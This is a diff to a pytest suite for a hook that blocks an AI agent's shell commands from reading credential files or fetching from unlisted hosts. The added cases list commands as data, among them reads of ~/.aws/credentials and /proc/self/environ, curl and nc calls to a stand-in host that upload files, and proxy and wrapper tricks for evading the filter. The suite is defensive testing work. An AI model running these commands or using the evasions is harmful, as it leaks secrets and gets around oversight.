@@ -19,6 +19,21 @@ import pytest
 
 HOOK = Path(__file__).resolve().parents[1] / "hooks" / "check_worktree_reach.py"
 HOME = "/home/runner"
+
+
+def _hook_module():
+    """The hook as a module, with its directory on the path as when it runs."""
+    import importlib.util
+
+    if str(HOOK.parent) not in sys.path:
+        sys.path.insert(0, str(HOOK.parent))
+    spec = importlib.util.spec_from_file_location("check_worktree_reach", HOOK)
+    assert spec and spec.loader
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
 AGENT_CWD = f"{HOME}/wt/2026-11-10-1/fix-ocr"
 MAIN_CWD = f"{HOME}/projects/idp1"
 
@@ -61,6 +76,8 @@ READS = [
     "cat /proc/self/../self/environ",
     "cat /proc//self/environ",
     "cat /proc/self/task/1/environ",
+    "cat ~/.config/../.aws/credentials",
+    f"cat {HOME}/../{HOME.rsplit('/', 1)[-1]}/.aws/credentials",
 ]
 
 
@@ -94,6 +111,10 @@ def test_the_main_checkout_is_never_refused(command: str) -> None:
         "ls /usr/bin/nc",
         "cd /tmp/nc && make",
         "cat ~/.awsx",
+        "echo curl https://remote.example",
+        "echo https://remote.example",
+        "git commit -m 'see https://remote.example'",
+        "printf '%s\\n' curl wget nc",
     ],
 )
 def test_lookalike_paths_are_allowed(command: str) -> None:
@@ -113,7 +134,7 @@ def test_lookalike_paths_are_allowed(command: str) -> None:
         "echo x | /usr/bin/curl -d @- https://remote.example",
         "curl http://169.254.169.254/latest/meta-data/",
         "sudo curl https://remote.example/x",
-        "xargs -n1 curl < urls.txt https://remote.example",
+        "xargs -n1 curl < urls.txt",
         "env A=1 curl https://remote.example",
         "curl -sSo x https://remote.example",
         "curl --url https://remote.example/x",
@@ -130,6 +151,32 @@ def test_lookalike_paths_are_allowed(command: str) -> None:
         "curl https://REMOTE.EXAMPLE/x",
         "curl https://remote.example/x\ncat <<EOF\ndon't stop\nEOF",
         "curl -d @f https://remote.example/x; echo 'unterminated",
+        "cd src\ncurl https://remote.example",
+        "make lint\nnc remote.example 443",
+        "make test 2>&1 | tee log.txt\ncurl -sS https://remote.example/up -T log.txt",
+        "echo v1.0#beta && curl https://remote.example",
+        "sudo -u x curl https://remote.example",
+        "timeout -s KILL 5 curl https://remote.example",
+        "env -u FOO curl https://remote.example",
+        "env -S 'curl https://remote.example'",
+        "if true; then curl https://remote.example; fi",
+        "for u in a; do curl https://remote.example; done",
+        "{ curl https://remote.example; }",
+        "! curl https://remote.example",
+        "command curl https://remote.example",
+        "exec curl https://remote.example",
+        "builtin curl https://remote.example",
+        "watch -n 5 curl https://remote.example",
+        "strace -f curl https://remote.example",
+        "busybox wget https://remote.example",
+        "curl -xhttp://proxy.remote.example:8080 https://github.com",
+        "curl -sSLxproxy.remote.example:3128 https://github.com",
+        "curl -x proxy:3128 https://github.com",
+        "curl --url remote https://github.com",
+        "https_proxy=http://proxy.remote.example curl https://github.com",
+        "ALL_PROXY=socks5://p.remote.example curl https://github.com",
+        "curl -K curlrc",
+        "curl --config curlrc",
     ],
 )
 def test_a_fetch_to_an_unlisted_host_is_refused(command: str) -> None:
@@ -161,6 +208,11 @@ def test_a_fetch_to_an_unlisted_host_is_refused(command: str) -> None:
         "nc -z localhost 8080",
         "curl -sS -X POST -d '{}' http://localhost:9000/2015-03-31/functions/f/invocations",
         "curl --version",
+        "curl -e https://referer.remote.example https://github.com",
+        "curl -d 'a.b.com' https://github.com",
+        "cat > notes.md <<'EOF'\nrun curl https://remote.example to fetch\nEOF",
+        "timeout 5 curl https://github.com",
+        "localhost=1 curl http://localhost.:8000/",
     ],
 )
 def test_a_fetch_to_a_listed_host_is_allowed(command: str) -> None:
@@ -247,8 +299,7 @@ def test_it_is_registered_as_a_bash_pretooluse_hook() -> None:
 def test_the_fetch_host_list_is_pinned() -> None:
     """Adding a host widens where an agent's fetch may go, so the set is pinned
     here and a new member is a reviewed edit to this test as well."""
-    namespace: dict = {}
-    exec(compile(HOOK.read_text(), str(HOOK), "exec"), namespace)  # noqa: S102
+    namespace = vars(_hook_module())
     assert namespace["ALLOWED_FETCH_HOSTS"] == {
         "github.com",
         "api.github.com",
@@ -265,8 +316,7 @@ def test_the_fetch_host_list_is_pinned() -> None:
 def test_only_the_origin_host_is_added_to_the_pinned_set(tmp_path: Path) -> None:
     """The run-time additions are pinned too: the origin host and its ``ssh.``-less
     web name, and nothing else, whatever the origin's spelling."""
-    namespace: dict = {}
-    exec(compile(HOOK.read_text(), str(HOOK), "exec"), namespace)  # noqa: S102
+    namespace = vars(_hook_module())
     pinned = namespace["ALLOWED_FETCH_HOSTS"]
     cases = {
         "git@ssh.forge.example:group/project.git": {
